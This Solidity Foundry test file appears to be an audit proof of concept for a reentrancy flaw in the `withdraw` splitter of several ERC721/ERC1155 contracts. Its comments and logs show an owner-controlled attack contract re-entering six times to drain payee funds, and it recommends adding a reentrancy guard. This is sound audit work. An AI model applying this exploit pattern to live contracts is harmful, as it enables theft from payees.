// Rentry via `withdraw` method from the owner can potentially steal funds from `payees`

// withdraw with splitters are located in the following contracts:

// ERC1155Basic.sol
// ERC1155Lazy.sol
// ERC1155Minimal.sol
// ERC1155Whitelist.sol

// ERC721Basic.sol
// ERC721Lazy.sol
// ERC721Minimal.sol
// ERC721Whitelist.sol

// 10 ether is sent to the MadHackSafeETH Contract to represent the `balance` of the contract including `fees`

// `feeCount` is set to 1 ether in the contract.

// receive function in the Attack contract does a simple calculation to determine when to stop re-entry.

// address(madHackSafeETH).balance >= (startBalance - (startBalance / 2))

// NOTE: This calculation is specific to the amounts in this POC.
// A more advanced calculation will be required to `automate` this and clear the contract completely.
// OR is may not be possible for certain situations. 
// Further investigation is out of scope as the issue is demonstrated as an attack vector.


// Logs:
//   Pre: victimSplitter1.balance      : 0
//   Pre: victimSplitter2.balance      : 0
//   Pre: madHackSafeETH.getbalance    : 10000000000000000000
//   Pre: attack.getbalance            : 0

//   Post: victimSplitter1.balance     : 1950000000000000000
//   Pre: victimSplitter2.balance      : 1950000000000000000
//   Post: madHackSafeETH.getbalance   : 100000000000000000
//   Post: attack.getbalance           : 6000000000000000000

//   Number times Entered              : 6


// Re-entrancy is further possible via a 'payee' attempting the same attack.  
// It would be interesting to investigate but this is out of scope for this audit.  
// Adding rentrancy guard will protect both attack vectors in this instance.

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "forge-std/Test.sol";
import {MadHackSafeETH, Attack} from "./mocks/safeEthHack.sol";

contract MadHackTest is Test {
    MadHackSafeETH public madHackSafeETH;
    Attack public attack;

    address hackerOwner = makeAddr("HackerOwner");
    address victimSplitter1 = makeAddr("VictimSplitter1");
    address victimSplitter2 = makeAddr("VictimSplitter2");

    address[] payees = [victimSplitter1, victimSplitter2];

    uint256 startBalance = 10 ether;

    function setUp() public {
        madHackSafeETH = new MadHackSafeETH(payees);
        madHackSafeETH.deposit{value: startBalance}();
        attack = new Attack(address(madHackSafeETH), hackerOwner);
        vm.deal(hackerOwner, 1000000);
        // vm.deal(victimSplitter1, 1 ether);
    }

    function _runAttackOnce() private {
        emit log_named_uint("Pre: victimSplitter1.balance      ", victimSplitter1.balance);
        emit log_named_uint("Pre: victimSplitter2.balance      ", victimSplitter2.balance);
        emit log_named_uint("Pre: madHackSafeETH.getbalance    ", address(madHackSafeETH).balance);
        emit log_named_uint("Pre: attack.getbalance            ", address(attack).balance);

        attack.attack{gas: 1_000_000}(startBalance);

        emit log_named_uint("Post: victimSplitter1.balance     ", victimSplitter1.balance);
        emit log_named_uint("Pre: victimSplitter2.balance      ", victimSplitter2.balance);
        emit log_named_uint("Post: madHackSafeETH.getbalance   ", address(madHackSafeETH).balance);
        emit log_named_uint("Post: attack.getbalance           ", address(attack).balance);

        emit log_named_uint("Number times Entered              ", madHackSafeETH.passThrough());
    }

    function testWithdrawRentryAttack() public {
        uint256 blockNumber = 10_000_120;
        // vm.roll(++blockNumber);

        _runAttackOnce();

        // for (uint256 i = 0; i < 5; i++) {
        //     startBalance = address(madHackSafeETH).balance;
        //     _runAttackOnce();
        //     startBalance = startBalance / 2;
        //     vm.roll(++blockNumber);
        // }
    }
}